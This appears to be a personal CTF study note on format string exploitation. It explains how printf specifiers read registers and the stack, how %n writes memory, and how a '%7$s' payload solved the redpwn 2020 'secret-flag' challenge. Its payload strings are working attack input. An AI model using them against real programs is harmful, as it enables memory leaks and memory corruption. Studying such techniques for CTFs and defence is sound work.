# Pwn Challenge

## Format String attack

### Introduction

usecase:  when there is the instruction printf(var)

```lang=c
char w[10];
printf(w)
```

format and corresponding register

```lang=c
printf("%d%c%s", a,  b,  c);
          |      |   |   |
         rdi    rsi rdx rcx
```

variable prirority for format string
`rdi` -> `rsi` -> `rdx` -> `rcx` -> `r8` -> `r9` -> `stack`

Usually rdi will be the format string `%x`, so a single `%x` will actually print the value of `rsi`

For instances, the sample register status and code execution

```lang=python
...
r8 = (nil)
rcx = 0xa
rdx = 0x7ffff7dd3790
rsi = 0x1
rdi = 0xXXX # %x,%s,%p format string


call printf@plt

output:

0x1,0x7ffff7dd3790,0xa,(nil),0x7ffff7fe9700,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x400070,0x7fffffffe940,0x7b74f8be5cadfe00,0x4006f0
 |         |        |    |         |               |                   |                   |                 |      
rsi       rdx      rcx  r8        r9              rsp              rsp + 0x8           rsp + 0x10        rsp + 0x18
```


That is, when inserting payload, the first 6 %x will print the address stored in the register, the 7th %x will then print the address/value on the stack.

- %p: print value of the register or stack(in hex format, 64 bits)
- %x: print value of the register or stack(in hex format, 32 bits)
- %s: perceive the value of the register as a pointer, read the strings the pointer point to
- %7$p: read the 7th priority value(that is, second value of the stack)
- %n: write the number of succesfully printed value(the return value of printf) to the specific stack address or register 

```lang=c
aaaaaaaa%n
in this case, it will write 8 to the specific address, since there are 8 'a' in front of %n
```

```lang=c
aaaaaaaa%6$nbbbbbbbb%7$n
first %n it will write 8 to rsp and write 8 to rsp + 8
```

Faster & shorter way to construct the value for %n
```lang=c
%8c%6$n -> %8c will write 8 value of the rdi to the %6$n location, which is rsp
```

you can also use %lln, %n %hn to write different amount of data, please visit the reference webpage

#### printf_chk

almost the same as printf, only %n,%x$y is forbidden

#### [redpwn 2020 secret-flag]

payload: `%p%p%p%p%p%p%p %s` <br /> or `%7$s` (simply perceive 7th priority value as pointer, and read the strings pointer pointed to)

-> first 6 %p print the value of the register, the last %p and %s print the value on the stack, since the second address on the stack is a pointer pointing to the flag, we can utilize the %s to print the value the pointer pointed to.

#### Reference

[frozenkp string format introduction](https://frozenkp.github.io/pwn/format_string/)
[live overflow strfmt](https://www.youtube.com/watch?v=0WvrSfcdq1I)